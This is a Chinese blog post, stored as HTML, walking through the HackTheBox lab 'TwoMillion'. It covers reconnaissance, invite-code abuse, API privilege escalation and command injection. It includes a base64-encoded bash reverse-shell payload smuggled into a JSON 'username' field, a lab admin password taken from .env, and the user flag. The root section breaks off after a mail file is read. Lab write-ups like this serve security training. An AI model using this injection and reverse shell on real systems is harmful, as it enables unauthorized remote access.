@@ -1,0 +1,1083 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="USER FLAG首先用nmap扫一下 1nmap -A 10.10.11.221   扫到22和80端口 80端口要设置一下域名解析才能正常访问，在&#x2F;etc&#x2F;hosts文件 110.10.11.221 2million.htb   1http:&#x2F;&#x2F;2million.htb&#x2F;   用dirsearch扫一下目录： 1dirsearch -u http:&#x2F;&#x2F;2million.htb&#x2F; -e *">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TwoMillion">
+<meta property="og:url" content="https://yschen20.github.io/2025/12/24/TwoMillion/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="USER FLAG首先用nmap扫一下 1nmap -A 10.10.11.221   扫到22和80端口 80端口要设置一下域名解析才能正常访问，在&#x2F;etc&#x2F;hosts文件 110.10.11.221 2million.htb   1http:&#x2F;&#x2F;2million.htb&#x2F;   用dirsearch扫一下目录： 1dirsearch -u http:&#x2F;&#x2F;2million.htb&#x2F; -e *">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224202323657.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224202600428.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224202714287.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224202851505.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203014194.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203059143.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203315424.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203434194.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203528531.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203602437.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203644349.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224203847684.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204008987.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204018295.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204037271.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204112473.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204300603.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204310169.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204423421.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204737321.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224204849964.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205051996-1766580652516-1.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205240919.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205312431.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205442706.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205536954.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205805333.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224205858031.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210021542.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210131295.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210145140.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210224123.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210310154.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224210353444.png">
+<meta property="article:published_time" content="2025-12-24T13:05:15.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:05:54.620Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/12/24/TwoMillion/image-20251224202323657.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>TwoMillion - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TwoMillion"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-24 21:05" pubdate>
+          2025年12月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          954 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TwoMillion</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-12-24T21:05:54+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="USER-FLAG"><a href="#USER-FLAG" class="headerlink" title="USER FLAG"></a>USER FLAG</h1><p>首先用nmap扫一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.10.11.221<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224202323657.png" srcset="/img/loading.gif" lazyload alt="image-20251224202323657"></p>
+<p>扫到<code>22</code>和<code>80</code>端口</p>
+<p><code>80</code>端口要设置一下域名解析才能正常访问，在<code>/etc/hosts</code>文件</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.221</span> 2million.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224202600428.png" srcset="/img/loading.gif" lazyload alt="image-20251224202600428"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//2million.htb/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224202714287.png" srcset="/img/loading.gif" lazyload alt="image-20251224202714287"></p>
+<p>用dirsearch扫一下目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://2million.htb/ -e *<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224202851505.png" srcset="/img/loading.gif" lazyload alt="image-20251224202851505"></p>
+<p>有<code>/login</code>和<code>/register</code>两个路由，先去注册</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203014194.png" srcset="/img/loading.gif" lazyload alt="image-20251224203014194"></p>
+<p>发现需要邀请码，再去看看源码</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203059143.png" srcset="/img/loading.gif" lazyload alt="image-20251224203059143"></p>
+<p>可以找到<code>inviteapi.min.js</code>文件，看名字应该是和邀请码 API 接口有关的，但是这里做了混淆</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p,a,c,k,e,d</span>)&#123;e=<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(c--)&#123;d[c.<span class="hljs-title function_">toString</span>(a)]=k[c]||c.<span class="hljs-title function_">toString</span>(a)&#125;k=[<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> d[e]&#125;];e=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span>(c--)&#123;<span class="hljs-keyword">if</span>(k[c])&#123;p=p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span>+<span class="hljs-title function_">e</span>(c)+<span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),k[c])&#125;&#125;<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0</span>,&#123;&#125;))<br></code></pre></td></tr></table></figure>
+
+<p>可以用在线网站反混淆恢复一下：<a target="_blank" rel="noopener" href="https://thanhle.io.vn/de4js/">https://thanhle.io.vn/de4js/</a></p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203315424.png" srcset="/img/loading.gif" lazyload alt="image-20251224203315424"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyInviteCode</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">var</span> formData = &#123;<br>        <span class="hljs-string">&quot;code&quot;</span>: code<br>    &#125;;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">data</span>: formData,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/verify&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)<br>        &#125;<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">makeInviteCode</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第二个函数看起来是可以获取到邀请码的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://2million.htb/api/v1/invite/generate<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224203434194.png" srcset="/img/loading.gif" lazyload alt="image-20251224203434194"></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">M0RFOFQtME82OEotR00yV0MtWEJCTzg</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<p>看样子是经过base64编码的，解码一下</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203528531.png" srcset="/img/loading.gif" lazyload alt="image-20251224203528531"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3DE8T</span>-<span class="hljs-number">0</span>O68J-GM2WC-XBBO8<br></code></pre></td></tr></table></figure>
+
+<p>带着邀请码去注册一个账号</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203602437.png" srcset="/img/loading.gif" lazyload alt="image-20251224203602437"></p>
+<p>成功注册，然后登录</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224203644349.png" srcset="/img/loading.gif" lazyload alt="image-20251224203644349"></p>
+<p>通过抓包可以看到请求时<code>/api/v1</code>开头的，可以访问看看有没有其他接口：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">2</span>million.htb<span class="hljs-regexp">/api/</span>v1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224203847684.png" srcset="/img/loading.gif" lazyload alt="image-20251224203847684"></p>
+<p>看到有admin有关的，其中<code>/api/v1/admin/settings/update</code>可以用来提升权限为admin，一点点根据报错补全参数：</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204008987.png" srcset="/img/loading.gif" lazyload alt="image-20251224204008987"></p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204018295.png" srcset="/img/loading.gif" lazyload alt="image-20251224204018295"></p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204037271.png" srcset="/img/loading.gif" lazyload alt="image-20251224204037271"></p>
+<p>这就设置成功了，可以在<code>/api/v1/admin/auth</code>接口确认一下</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204112473.png" srcset="/img/loading.gif" lazyload alt="image-20251224204112473"></p>
+<p>显示的是<code>true</code>，就是成功提升为admin权限了，然后就可以访问<code>/api/v1/admin/vpn/generate</code>这个接口</p>
+<p>也是一点点补全参数：</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204300603.png" srcset="/img/loading.gif" lazyload alt="image-20251224204300603"></p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204310169.png" srcset="/img/loading.gif" lazyload alt="image-20251224204310169"></p>
+<p>这里<code>username</code>参数存在命令注入，可以利用管道符<code>;</code>进行RCE</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224204423421.png" srcset="/img/loading.gif" lazyload alt="image-20251224204423421"></p>
+<p>直接反弹shell</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS8yMzMzIDA+JjE= | base64 -d| /bin/bash;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224204737321.png" srcset="/img/loading.gif" lazyload alt="image-20251224204737321"></p>
+<p>找找<code>user.txt</code>位置</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name user.txt <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224204849964.png" srcset="/img/loading.gif" lazyload alt="image-20251224204849964"></p>
+<p>在<code>/home/admin/user.txt</code>，要<code>admin</code>用户才能读到</p>
+<p>看看网站目录下的文件，看到有<code>.env</code>文件，里面正好有<code>admin</code>数据凭证</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224205051996-1766580652516-1.png" srcset="/img/loading.gif" lazyload alt="image-20251224205051996"></p>
+<p>可以得到密码是<code>SuperDuperPass123</code>，然后切换为<code>admin</code>用户，可以用命令生成交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">su admin<br>/usr/bin/script -qc /bin/bash /dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224205240919.png" srcset="/img/loading.gif" lazyload alt="image-20251224205240919"></p>
+<p>可以读到user flag了</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224205312431.png" srcset="/img/loading.gif" lazyload alt="image-20251224205312431"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">7322</span>b<span class="hljs-number">46800</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>a<span class="hljs-number">626</span>d<span class="hljs-number">60</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">331</span><span class="hljs-keyword">c</span><span class="hljs-number">450</span>eed<br></code></pre></td></tr></table></figure>
+
+<h1 id="ROOT-FLAG"><a href="#ROOT-FLAG" class="headerlink" title="ROOT FLAG"></a>ROOT FLAG</h1><p>然后就是提权为root了，查找一下和admin有关的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user admin -<span class="hljs-built_in">type</span> f 2&gt;/dev/null | grep -Ev <span class="hljs-string">&quot;^/proc|^/run|^/sys&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224205442706.png" srcset="/img/loading.gif" lazyload alt="image-20251224205442706"></p>
+<p>可以看到有个邮件，读一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/mail/admin<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224205536954.png" srcset="/img/loading.gif" lazyload alt="image-20251224205536954"></p>
